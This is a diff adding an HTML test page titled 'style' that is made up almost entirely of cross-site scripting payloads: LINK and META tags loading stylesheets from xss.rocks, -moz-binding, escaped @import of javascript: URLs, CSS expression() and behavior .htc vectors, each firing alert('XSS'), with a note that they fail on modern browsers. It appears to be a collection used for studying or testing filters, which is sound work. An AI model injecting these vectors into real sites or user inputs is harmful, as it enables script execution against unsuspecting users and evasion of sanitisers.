@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+  <STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+  <title>style</title>
+  <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+  <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+
+</head>
+<body>
+  <p>not working on modern browsers</p>
+  <STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+
+  <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+  <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+  <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+  <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+  <XSS STYLE="xss:expression(alert('XSS'))"></XSS>  
+  
+  <XSS STYLE="behavior: url(xss.htc);"></XSS>
+  <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+    exp/*<A STYLE='no\xss:noxss("*//*");
+    xss:ex/*XSS*//*/*/pression(alert("XSS"))'>   
+</body>
+</html>
